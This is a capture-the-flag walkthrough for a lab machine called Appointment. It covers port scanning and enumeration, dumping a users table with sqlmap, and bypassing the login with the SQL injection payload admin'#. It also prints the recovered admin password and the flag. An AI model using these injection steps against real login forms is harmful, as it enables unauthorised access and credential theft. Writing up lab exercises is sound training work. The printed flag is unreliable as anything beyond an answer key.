
## CTF Writeup: Appointment

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.46.21              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 17:31 -0500
Nmap scan report for 10.129.46.21
Host is up (0.024s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.62 seconds
```

There is only an webpage running on port 80. The webpage seems to be an login panel!

Mapped the target ip address to an domain called "appointment.htb".

```
echo "10.129.46.21 appointment.htb" | tee -a /etc/hosts
```

Enumerated Subdomains, but didn't find anything.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://appointment.htb -H "Host: FUZZ.appointment.htb" -fs 4896
```

Enumerated endpoints, but couldn't find anything useful.

```
feroxbuster --url http://appointment.htb
```

Since everything lead to nothing I will run sqlmap & check if it works. 

1. Started up my Web-Proxy Tool BurpSuite.
2. Started up FoxyProxy so the web traffic get's funnelled on port 8080.
3. Captured package & stored it inside an sql.req file on my local machien
4. Executed the following command to enumerate databases:

```
sqlmap -r sql.req --batch -dbs
```

5. Enumerated Tables of the appdb database.

```
sqlmap -r sql.req --batch -D appdb --tables
```

6. Dumped users table

```
sqlmap -r sql.req --batch -D appdb -T users --dump
```

Retrieved admin credentials:

```
admin:328ufsdhjfu2hfnjsekh3rihjfcn23KDFmfesd239"23m^jdf
```

Also found another way to bypass the Login Panel by prompting the following it bypassed it:

```
admin'#
```

Retrieved flag.txt

```
e3d0796d002a446c0e622226f42e9672
```